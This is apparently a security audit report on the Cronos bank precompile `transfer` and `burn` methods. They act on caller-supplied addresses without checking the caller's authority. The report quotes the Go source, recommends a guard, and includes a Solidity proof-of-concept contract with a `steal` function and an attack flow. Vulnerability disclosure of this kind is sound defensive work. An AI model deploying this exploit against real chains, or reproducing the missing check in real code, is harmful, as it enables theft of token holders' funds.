### Title
Bank Precompile `transfer` Lacks Caller-Authorization Check, Enabling Any EVM Contract to Drain Arbitrary Holders of Its Denomination — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary

The `BankContract` precompile's `transfer` method accepts an arbitrary `sender` address and moves native bank tokens from that address to an arbitrary `recipient`, using `contract.Caller()` only to derive the token denomination — never to verify that the caller is authorized to spend from `sender`. Any EVM contract can therefore drain any account that holds tokens of its denomination (`evm/<contract_address>`) without the holder's consent.

### Finding Description

In `BankContract.Run` the `transfer` branch unpacks three arguments — `sender`, `recipient`, `amount` — and calls `bankKeeper.SendCoins(ctx, from, to, ...)` where `from = sdk.AccAddress(sender.Bytes())`:

```go
// x/cronos/keeper/precompiles/bank.go  lines 167-200
case TransferMethodName:
    sender    := args[0].(common.Address)   // arbitrary, caller-supplied
    recipient := args[1].(common.Address)   // arbitrary, caller-supplied
    amount    := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())    // "evm/<calling_contract>"
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`contract.Caller()` is used **only** to compute the denomination; it is never compared to `sender`. There is no guard of the form `require sender == contract.Caller()`. The same structural omission exists in the `burn` branch, where `args[0]` is the address whose tokens are destroyed, again without verifying the caller's authority over that address. [1](#0-0) [2](#0-1) 

### Impact Explanation

The denomination namespace `evm/<contract_address>` is the only isolation boundary. A contract is the sole entity that can mint tokens of its denomination, so it is also the entity that determines who holds them. Once users hold `evm/M` tokens (e.g., after interacting with a DeFi protocol deployed at `M`), the contract at `M` can call `bank.transfer(victim, attacker, balance)` and atomically move every holder's balance to an attacker-controlled address — bypassing any ERC-20 approval mechanism. This constitutes **unauthorized transfer of precompile-controlled assets** (Critical impact class).

The `burn` variant allows the same contract to destroy any holder's balance without consent, which is a direct, irreversible loss of funds. [3](#0-2) 

### Likelihood Explanation

The bank precompile is registered at address `0x0000...0064` and is callable by any EVM contract with no access-control gate at the precompile entry point. The only existing guard (`checkBlockedAddr`) checks the *recipient*, not the *sender*, and is unrelated to caller authorization. Any contract deployer — an unprivileged actor — can exploit this immediately after minting tokens to users. [4](#0-3) [5](#0-4) 

### Recommendation

In the `transfer` branch, enforce that the immediate EVM caller is the authorized spender of `sender`'s funds:

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the token sender")
}
```

Apply the equivalent guard in the `burn` branch (`contract.Caller() != recipient/addr`). If delegated spending is a desired feature, implement an explicit allowance mapping inside the precompile, analogous to ERC-20 `approve`/`transferFrom`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankPrecompileStealPOC {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64));

    // Step 1: attacker's contract mints evm/<this> tokens to victim
    //         (simulates a DeFi protocol distributing rewards/deposits)
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: attacker calls transfer(victim, attacker, amount) —
    //         no ownership check in the precompile, succeeds unconditionally
    function steal(address victim, address attacker, uint256 amount) external {
        bool ok = bank.transfer(victim, attacker, amount);
        require(ok, "steal failed");
        // attacker now holds evm/<this> tokens previously owned by victim
    }
}
```

Attack flow:
1. Deploy `BankPrecompileStealPOC` at address `M`.
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/M` tokens.
3. Call `steal(victim, attacker, 1000)` — the precompile executes `SendCoins(victim → attacker, 1000 evm/M)` with no authorization check.
4. Victim's balance is zero; attacker holds 1000 `evm/M` tokens. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L30-34)
```go
var (
	bankABI                 abi.ABI
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
)
```

**File:** x/cronos/keeper/precompiles/bank.go (L92-101)
```go
func (bc *BankContract) checkBlockedAddr(addr sdk.AccAddress) error {
	to, err := sdk.AccAddressFromBech32(addr.String())
	if err != nil {
		return err
	}
	if bc.bankKeeper.BlockedAddr(to) {
		return errorsmod.Wrapf(errortypes.ErrUnauthorized, "%s is not allowed to receive funds", to.String())
	}
	return nil
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-156)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
